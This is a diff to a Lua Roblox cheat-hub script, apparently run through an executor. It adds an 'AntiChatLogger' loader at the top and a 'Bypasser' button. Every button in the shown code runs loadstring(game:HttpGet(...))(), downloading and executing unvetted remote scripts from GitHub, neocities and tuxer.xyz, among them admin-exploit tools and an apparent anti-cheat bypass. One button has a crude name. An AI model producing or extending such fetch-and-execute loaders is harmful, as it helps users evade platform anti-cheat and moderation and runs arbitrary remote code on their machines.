@@ -10,6 +10,8 @@ Credits to BBQ
 Brought to you by Jinquillivus Productions
 ]]--
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "Glazer's Washiez Hub"
 gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -246,37 +248,41 @@ createButton("See Warnings", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/illumina0001/bloxton/main/seewarnings.lua"))()
 end, 150)
 
+createButton("Bypasser", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/LocalNeverPatchedBypass.txt"))()
+end, 200)
+
 createButton("Penis Plate", function()
 loadstring(game:HttpGet("https://tuxer.xyz/loader?file=penisplates"))()
-end, 200)
+end, 250)
 
 createButton("Nameless", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
-end, 250)
+end, 300)
 
 createButton("infinite yield", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-end, 300)
+end, 350)
 
 createButton("GlazerBot", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/Glazerbot"))()
-end, 350)
+end, 400)
 
 createButton("ScalpBot", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/Scalpbot"))()
-end, 400)
+end, 450)
 
 createButton("fake cuff", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/fakecuff"))()
-end, 450)
+end, 500)
 
 createButton("Ghost Mode", function()
     loadstring(game:HttpGet('https://korisnik99.neocities.org/message%20(2).txt'))()
-end, 500)
+end, 550)
 
 createButton("R6", function()
     loadstring(game:HttpGet('https://korisnik99.neocities.org/message%20(6).txt'))()
-end, 550)
+end, 600)
 
 createButton("animation changer", function()
 local AnimationChanger = Instance.new("ScreenGui")
